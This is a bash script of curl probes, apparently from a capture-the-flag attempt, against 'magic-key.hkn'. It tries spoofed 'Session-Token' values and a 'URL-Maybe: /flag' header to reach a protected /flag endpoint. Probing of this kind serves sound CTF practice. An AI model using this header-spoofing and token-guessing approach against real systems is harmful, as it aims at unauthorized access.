#!/bin/bash

echo "### next_chars med praecis samme headers som .137 (decoy-vaerdier) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/next_chars?char=d" \
    -H "Session-Token: dGhpcyB0b2tlbiBpcyBub3QgZ29vZA" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### next_chars med very-good-session-token + URL-Maybe: /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/next_chars?char=s" \
    -H "Session-Token: very-good-session-token" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### /flag med URL-Maybe: /flag + Session-Token ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/flag" \
    -H "Session-Token: very-good-session-token" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### next_chars KUN med URL-Maybe: /flag (uden Session-Token) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/next_chars?char=s" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### next_chars med URL-Maybe: /next_chars ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/next_chars?char=s" \
    -H "Session-Token: very-good-session-token" \
    -H "URL-Maybe: /next_chars"
echo ""; echo "---"
